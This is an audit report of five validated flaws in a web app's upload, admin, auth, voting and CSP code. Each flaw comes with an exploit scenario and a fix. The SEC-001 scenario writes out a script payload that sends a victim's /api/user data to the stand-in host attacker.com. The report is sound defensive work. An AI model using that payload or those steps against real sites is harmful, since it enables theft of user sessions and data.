# Vulnerabilities Report

## SEC-001: Stored XSS via File Upload (MIME-Type Spoofing)

-   **Status:** VALIDATED
-   **Severity:** CRITICAL
-   **Risk:** High (Likelihood: High × Impact: Critical)
-   **Category:** Injection / Unrestricted File Upload
-   **Affected Code:**
    -   `server/routes.ts`: Lines 59 (File Filter), 53 (Filename Generation), 224 (Static Serving).
-   **Description:**
    The application allows users to upload files (images/videos). The validation relies solely on the `file.mimetype` property provided by the client (browser), which is easily spoofed. The filename extension is derived from the original filename (`path.extname(file.originalname)`).
    An attacker can upload a malicious HTML file (e.g., `exploit.html`) containing JavaScript, while setting the `Content-Type` header to `image/jpeg`. The server accepts the file because of the MIME check, saves it with the `.html` extension, and serves it via `express.static`. When a victim visits the file URL, the browser executes the arbitrary JavaScript in the context of the application's origin.
-   **Exploit Scenario:**
    1.  Attacker creates `exploit.html` with `<script>fetch('/api/user').then(r=>r.json()).then(d=>navigator.sendBeacon('http://attacker.com', JSON.stringify(d)))</script>`.
    2.  Attacker uploads this file to `POST /api/posts` but intercepts the request to change `Content-Type: multipart/form-data; ... Content-Type: image/jpeg`.
    3.  Server accepts it and returns a URL like `/uploads/123456-789.html`.
    4.  Attacker shares this URL. Victims clicking it will have their session data stolen.
-   **Remediation:**
    -   **Validation:** Do NOT trust `file.mimetype`. Use a library like `file-type` to inspect the file buffer magic bytes.
    -   **Sanitization:** Do NOT use `path.extname` from user input. Generate a safe extension based on the *detected* file type (e.g., always save as `.jpg` if it's an image).
    -   **Serving:** Serve user content from a separate domain (CDN) or use `Content-Disposition: attachment` to prevent execution.

## SEC-002: Admin API Password Hash Leakage

-   **Status:** VALIDATED
-   **Severity:** MEDIUM
-   **Risk:** Medium (Likelihood: Low × Impact: High)
-   **Category:** Sensitive Data Exposure
-   **Affected Code:**
    -   `server/storage.ts`: `getUsers()` (SQLite and Drizzle implementations).
    -   `server/routes.ts`: `GET /api/admin/users` (Line 1329).
-   **Description:**
    The `getUsers` method in `storage.ts` returns the full user record, including the `password` field (which contains the scrypt hash). The `/api/admin/users` endpoint returns this data directly to the admin frontend. While not public, if an admin account is compromised (e.g., via SEC-001), the attacker instantly gains access to all user password hashes, allowing for offline cracking.
-   **Exploit Scenario:**
    1.  Attacker compromises an Admin account (via XSS or Phishing).
    2.  Attacker queries `GET /api/admin/users`.
    3.  Attacker retrieves all user hashes and cracks them offline.
-   **Remediation:**
    -   Apply `sanitizeUser` in `getUsers` method or in the route handler before sending the response.

## SEC-003: Banned User Session Persistence

-   **Status:** VALIDATED
-   **Severity:** MEDIUM
-   **Risk:** Medium (Likelihood: Medium × Impact: Medium)
-   **Category:** Broken Access Control
-   **Affected Code:**
    -   `server/auth.ts`: `deserializeUser` (Line 128).
    -   `server/routes.ts`: `isAuthenticated` middleware.
-   **Description:**
    The application checks for negative karma (ban status) only during the *login* process (`LocalStrategy`). It does not check the user's status during session deserialization or in the `isAuthenticated` middleware. If a user is banned *while* they have an active session, they remain logged in and can continue to post, comment, and interact until their session expires (24 hours).
-   **Exploit Scenario:**
    1.  User acts maliciously.
    2.  Admin sets user Karma to -100 (Ban).
    3.  User is still logged in and continues to spam/harass for hours.
-   **Remediation:**
    -   Update `deserializeUser` to check `user.karma` (or a `banned` flag). If banned, return `done(null, false)` to invalidate the session.

## SEC-004: Race Condition in Voting Logic

-   **Status:** VALIDATED
-   **Severity:** LOW
-   **Risk:** Low (Likelihood: Low × Impact: Low)
-   **Category:** Business Logic Flaw / Race Condition
-   **Affected Code:**
    -   `server/routes.ts`: `POST /api/posts/:id/react` (Lines 427-484).
-   **Description:**
    The voting logic performs a "Check-then-Act" sequence: it fetches the current reaction, then calculates the update, then writes the new reaction. In a high-concurrency environment (or intentional attack), multiple requests can read the same "initial state" (null reaction) and both apply a +1 Karma increase, effectively allowing a double-vote.
-   **Remediation:**
    -   Use database constraints (Unique Key on `user_id, post_id`) to enforce uniqueness at the DB level. SQLite/Postgres will throw an error on the second insert, preventing the logic flaw.

## SEC-005: Weak Content Security Policy (unsafe-inline)

-   **Status:** VALIDATED
-   **Severity:** LOW
-   **Risk:** Low (Likelihood: High × Impact: Low - exacerbates other issues)
-   **Category:** Security Misconfiguration
-   **Affected Code:**
    -   `server/routes.ts`: `app.use(helmet(...))` (Line 78).
-   **Description:**
    The CSP includes `scriptSrc: ["'self'", "'unsafe-inline'"]`. The `unsafe-inline` directive allows the execution of inline scripts. This significantly weakens the protection CSP offers against XSS. If an attacker can inject a `<script>` tag (as in SEC-001), it will execute.
-   **Remediation:**
    -   Remove `'unsafe-inline'`. Use Nonces or Hashes for necessary inline scripts (e.g., for hydration state).

## Appendix: Findings Log
-   **SEC-001** | VALIDATED | `server/routes.ts` file upload allows HTML extension | Critical Stored XSS.
-   **SEC-002** | VALIDATED | `server/routes.ts` /api/admin/users leaks passwords | Sensitive data exposure.
-   **SEC-003** | VALIDATED | `server/auth.ts` deserializeUser ignores ban | Session persistence.
-   **SEC-004** | VALIDATED | `server/routes.ts` race condition in voting | Logic flaw.
-   **SEC-005** | VALIDATED | `server/routes.ts` unsafe-inline CSP | Security misconfiguration.
